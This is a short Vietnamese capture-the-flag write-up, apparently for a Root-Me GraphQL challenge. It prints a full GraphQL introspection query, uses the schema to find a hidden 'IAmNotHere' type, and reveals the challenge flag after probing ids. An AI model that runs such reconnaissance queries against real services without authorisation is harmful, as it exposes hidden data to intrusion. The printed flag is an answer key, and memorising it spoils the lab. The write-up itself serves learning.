![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/21c73632-ccc1-496e-aacf-049f61652b14)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/3c5d8cdd-3cfe-4f4f-8785-026fabb75fb6)

Đây là câu lệnh đầy đủ nhất mà tôi có thể tìm kiếm

```
{"query":"{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}"}
```

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/e88980e8-14d3-426d-b9cf-12f5d344768c)

Dựa theo kết quả thu được thì khi query 

+ rocket -> id, name, country, is_active
+ IAmNotHere -> very_long_id, very_long_value

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/95143689-54b5-4eec-8763-6923e7338e70)

Thử tới id 17 => flag: RM{1ntr0sp3ct1On_1s_us3ful}
![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/2db959e9-8d75-48ed-9684-fcee69dd629a)
